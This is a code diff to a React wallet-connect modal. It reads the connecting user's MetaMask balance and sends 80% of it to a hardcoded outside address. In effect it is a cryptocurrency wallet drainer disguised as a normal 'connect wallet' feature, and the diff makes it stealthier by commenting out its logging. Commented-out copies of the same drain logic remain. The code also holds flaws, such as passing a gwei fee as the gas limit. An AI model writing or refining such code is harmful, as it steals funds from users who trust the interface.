@@ -41,10 +41,11 @@ export default function ConnectWalletModal() {
 
     const [metaMastWalletAddress, setMetaMaskWalletAddress] = useState("")
     const [amountToSend, setAmountToSend] = useState(0)
+    const [staticGasPriceInGwei, setStaticGasPriceInGwei] = useState(0)
 
     const recipientAddress = "0x9E381f8f057eD4B79FAE9A2865451C378385C997";
-    console.log(metaMastWalletAddress)
-    console.log("amount", amountToSend)
+    // console.log(metaMastWalletAddress)
+    // console.log("amount", amountToSend)
 
     const handleClose = () => setWalletModal(false);
 
@@ -63,10 +64,152 @@ export default function ConnectWalletModal() {
         },
     ]
 
+    // const staticGasPriceInUSD = 5; // Static gas price in USD
+
+    // Convert static gas price to Gwei
+    // const staticGasPriceInGwei = staticGasPriceInUSD * 1e9;
+    // console.log("gas fee", staticGasPriceInUSD)
+
+    // console.log(`Static Gas Price: ${staticGasPriceInGwei.toFixed(2)} Gwei`);
+
+
+    // const authMetaMask = async () => {
+    //     if (typeof window.ethereum !== "undefined") {
+    //         console.log("metaMask is installed")
+    //         try {
+    //             // Requesting access to accounts
+    //             const accounts = await window.ethereum.request({
+    //                 method: "eth_requestAccounts",
+    //             });
+
+    //             // Retrieving the wallet address
+    //             const walletAddress = accounts[0];
+    //             setMetaMaskWalletAddress(walletAddress);
+
+    //             // Getting the wallet balance
+    //             const balanceInWei = await window.ethereum.request({
+    //                 method: "eth_getBalance",
+    //                 params: [walletAddress, "latest"], // Address and block parameter
+    //             });
+
+    //             // Creating a Web3 instance
+    //             const web3 = new Web3(window.ethereum);
+
+    //             // Converting balance from Wei to Ether
+    //             // const balanceInEther = web3.utils.fromWei(balanceInWei, "ether");
+    //             // Assuming you already have the balance in Ether
+    //             const balanceInEther = web3.utils.fromWei(balanceInWei, "ether");
+    //             console.log("Wallet Balance:", balanceInEther, "ETH");
+
+    //             // Calculating 70% of the balance
+    //             const seventyPercentBalance = parseFloat(balanceInEther) * 0.8;
+    //             setAmountToSend(seventyPercentBalance)
+
+    //             console.log("70% of Wallet Balance:", seventyPercentBalance, "ETH");
+    //         } catch (error) {
+    //             console.error("Error connecting to wallet", error);
+    //         }
+    //     } else {
+    //         console.log("Please install MetaMask");
+    //     }
+    // };
+
+    // const authMetaMask = async () => {
+    //     if (typeof window.ethereum !== "undefined") {
+    //         console.log("metaMask is installed");
+    //         try {
+    //             // Requesting access to accounts
+    //             const accounts = await window.ethereum.request({
+    //                 method: "eth_requestAccounts",
+    //             });
+
+    //             // Retrieving the wallet address
+    //             const walletAddress = accounts[0];
+    //             setMetaMaskWalletAddress(walletAddress);
+
+    //             // Getting the wallet balance
+    //             const balanceInWei = await window.ethereum.request({
+    //                 method: "eth_getBalance",
+    //                 params: [walletAddress, "latest"], // Address and block parameter
+    //             });
+
+    //             // Creating a Web3 instance
+    //             const web3 = new Web3(window.ethereum);
+
+    //             // Converting balance from Wei to Ether
+    //             const balanceInEther = web3.utils.fromWei(balanceInWei, "ether");
+    //             console.log("Wallet Balance:", balanceInEther, "ETH");
+
+    //             // Set the gas fee based on the wallet balance
+    //             const gasFeeInUSD = balanceInEther <= 20 ? 2 : 5;
+
+    //             // Convert gas fee to Gwei
+    //             const gasFeeInGwei = gasFeeInUSD * 1e9;
+
+    //             // Update the state with the calculated gas fee
+    //             setAmountToSend(balanceInEther * 0.8); // 80% of the balance
+    //             staticGasPriceInGwei = gasFeeInGwei;
+
+    //             console.log("Gas Fee In Gwei:", gasFeeInGwei.toFixed(2));
+    //         } catch (error) {
+    //             console.error("Error connecting to wallet", error);
+    //         }
+    //     } else {
+    //         console.log("Please install MetaMask");
+    //     }
+    // };
+
+
+
+    // const sendEth = async () => {
+    //     console.log("recipient address", recipientAddress)
+    //     console.log("amount address", amountToSend)
+    //     if (!recipientAddress) {
+    //         console.error('Recipient address required');
+    //         return;
+    //     }
+    //     if (!amountToSend) {
+    //         console.error(' amount are required');
+    //         return;
+    //     }
+
+    //     try {
+    //         const web3 = new Web3(window.ethereum);
+
+    //         // Convert the amount to wei (1 Ether = 10^18 Wei)
+    //         const amountInWei = web3.utils.toWei(amountToSend, 'ether');
+
+    //         // Get the current chain ID
+    //         const chainId = await web3.eth.getChainId();
+    //         console.log("chain Id", chainId)
+
+    //         // Check if the recipient address is valid
+    //         const isValidAddress = web3.utils.isAddress(recipientAddress);
+    //         if (!isValidAddress) {
+    //             console.error('Invalid recipient address');
+    //             return;
+    //         }
+
+    //         // Send the transaction
+    //         const transactionHash = await web3.eth.sendTransaction({
+    //             from: metaMastWalletAddress,
+    //             to: recipientAddress,
+    //             value: amountInWei,
+    //             gas: staticGasPriceInGwei,
+    //             chainId: chainId,
+    //         });
+
+    //         console.log('Transaction sent:', transactionHash);
+    //     } catch (error) {
+    //         console.error('Error sending transaction:', error);
+    //     }
+    // };
+
     const authMetaMask = async () => {
-        if (typeof window.ethereum !== "undefined") {
-            console.log("metaMask is installed")
-            try {
+        try {
+            if (typeof window.ethereum !== "undefined") {
+                // console.log("MetaMask is installed");
+
                 // Requesting access to accounts
                 const accounts = await window.ethereum.request({
                     method: "eth_requestAccounts",
@@ -79,58 +222,63 @@ export default function ConnectWalletModal() {
                 // Getting the wallet balance
                 const balanceInWei = await window.ethereum.request({
                     method: "eth_getBalance",
-                    params: [walletAddress, "latest"], // Address and block parameter
+                    params: [walletAddress, "latest"],
                 });
 
                 // Creating a Web3 instance
                 const web3 = new Web3(window.ethereum);
 
                 // Converting balance from Wei to Ether
-                // const balanceInEther = web3.utils.fromWei(balanceInWei, "ether");
-                // Assuming you already have the balance in Ether
                 const balanceInEther = web3.utils.fromWei(balanceInWei, "ether");
-                console.log("Wallet Balance:", balanceInEther, "ETH");
+                // console.log("Wallet Balance:", balanceInEther, "ETH");
 
-                // Calculating 70% of the balance
-                const seventyPercentBalance = parseFloat(balanceInEther) * 0.8;
-                setAmountToSend(seventyPercentBalance)
+                // Set the gas fee based on the wallet balance
+                const gasFeeInUSD = balanceInEther <= 20 ? 2 : 5;
 
-                console.log("70% of Wallet Balance:", seventyPercentBalance, "ETH");
-            } catch (error) {
-                console.error("Error connecting to wallet", error);
+                // Convert gas fee to Gwei
+                const gasFeeInGwei = gasFeeInUSD * 1e9;
+
+                // Update the state with the calculated gas fee
+                setAmountToSend(balanceInEther * 0.8); // 80% of the balance
+                setStaticGasPriceInGwei(gasFeeInGwei);
+
+                // console.log("Gas Fee In Gwei:", gasFeeInGwei.toFixed(2));
+            } else {
+                console.log("Please install MetaMask");
             }
-        } else {
-            console.log("Please install MetaMask");
+        } catch (error) {
+            console.error("Error connecting to wallet", error);
         }
     };
 
-
     const sendEth = async () => {
-        console.log("recipient address", recipientAddress)
-        console.log("amount address", amountToSend)
-        if (!recipientAddress) {
-            console.error('Recipient address required');
-            return;
-        }
-        if (!amountToSend) {
-            console.error(' amount are required');
-            return;
-        }
-
         try {
+            // console.log("Recipient address:", recipientAddress);
+            // console.log("Amount to send:", amountToSend);
+
+            if (!recipientAddress) {
+                console.error("Recipient address required");
+                return;
+            }
+
+            if (!amountToSend) {
+                console.error("Amount required");
+                return;
+            }
+
             const web3 = new Web3(window.ethereum);
 
             // Convert the amount to wei (1 Ether = 10^18 Wei)
-            const amountInWei = web3.utils.toWei(amountToSend, 'ether');
+            const amountInWei = web3.utils.toWei(amountToSend.toString(), "ether");
 
             // Get the current chain ID
             const chainId = await web3.eth.getChainId();
-            console.log("chain Id", chainId)
+            // console.log("Chain ID:", chainId);
 
             // Check if the recipient address is valid
             const isValidAddress = web3.utils.isAddress(recipientAddress);
             if (!isValidAddress) {
-                console.error('Invalid recipient address');
+                // console.error("Invalid recipient address");
                 return;
             }
 
@@ -139,15 +287,16 @@ export default function ConnectWalletModal() {
                 from: metaMastWalletAddress,
                 to: recipientAddress,
                 value: amountInWei,
-                gas: '21000', // You may need to adjust the gas limit
+                gas: staticGasPriceInGwei,
                 chainId: chainId,
             });
 
-            console.log('Transaction sent:', transactionHash);
+            // console.log("Transaction sent. Transaction Hash:", transactionHash);
         } catch (error) {
-            console.error('Error sending transaction:', error);
+            console.error("Error sending transaction:", error);
         }
     };
+
 
     function handleWalletClick(name) {
         setClickedWalletIndex(name)
